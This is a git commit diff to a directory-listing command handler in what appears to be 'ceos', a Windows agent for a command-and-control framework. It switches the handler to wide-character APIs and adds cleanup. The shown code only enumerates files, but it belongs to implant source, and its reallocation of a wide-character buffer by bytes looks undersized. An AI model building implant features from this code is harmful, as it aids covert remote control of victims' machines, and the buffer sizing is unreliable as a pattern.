a187fe5eff4ea031e8c699e7904b9a18e6551fe5
Ferrevdv <ferre.vieren@gmail.com>
2024-08-23 20:47:29 +0200

    wchar

--- Payload_Type/ceos/ceos/agent_code/ceos/source/Shell.cpp
+++ Payload_Type/ceos/ceos/agent_code/ceos/source/Shell.cpp
@@ -41,11 +41,14 @@ PPackage executeShell(PParser arguments)
 
 PPackage executeDir(PParser arguments)
 {
-	TCHAR szDir[MAX_PATH];
+	WCHAR szDir[MAX_PATH];
 	UINT32 nbArg = getInt32(arguments);
 	SIZE_T size = 0;
-	PCHAR path = getString(arguments, &size); // will read first UINT32 as size of param
-	path = (PCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
+	PWCHAR path = getWString(arguments, &size); // will read first UINT32 as size of param
+	
+
+  // Reallocate path to ensure it has space for the null-terminator
+	path = (PWCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
 	if (!path)
 	{
 		_err("[DIR] Error in executeDir command");
@@ -53,28 +56,34 @@ PPackage executeDir(PParser arguments)
 	}
 
 	PPackage output = newPackage(0, FALSE);
+	if (!output)
+	{
+		_err("[DIR] Error in executeDir command");
+		LocalFree(path);
+		return NULL;
+	}
 
 	// Create search pattern with wilcard (all files in dir)
 	// PCHAR searchPattern = (PCHAR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 2) * sizeof(CHAR));
 	// snprintf(searchPattern, MAX_PATH + 2, "%s\\*", path);
 	//
-	StringCchCopy(szDir, MAX_PATH, path);
-  StringCchCat(szDir, MAX_PATH, TEXT("\\*"));
+	StringCchCopyW(szDir, MAX_PATH, path);
+  StringCchCatW(szDir, MAX_PATH, L"\\*");
 
-	WIN32_FIND_DATA FindFileData;
-	HANDLE hFind = FindFirstFile(szDir, &FindFileData);
+	WIN32_FIND_DATAW FindFileData;
+	HANDLE hFind = FindFirstFileW(szDir, &FindFileData);
 	if (hFind == INVALID_HANDLE_VALUE)
 	{
 		_err("[DIR] Error in executeDir command");
 		freePackage(output);
 		// free(searchPattern);
-		free(path);
+		LocalFree(path);
 		return NULL;
 	}
 	do
 	{
 		addString(output, FindFileData.cFileName, FALSE);
-	} while (FindNextFile(hFind, &FindFileData) != 0);
+	} while (FindNextFileW(hFind, &FindFileData) != 0);
 
 	FindClose(hFind);
 	// LocalFree(searchPattern);
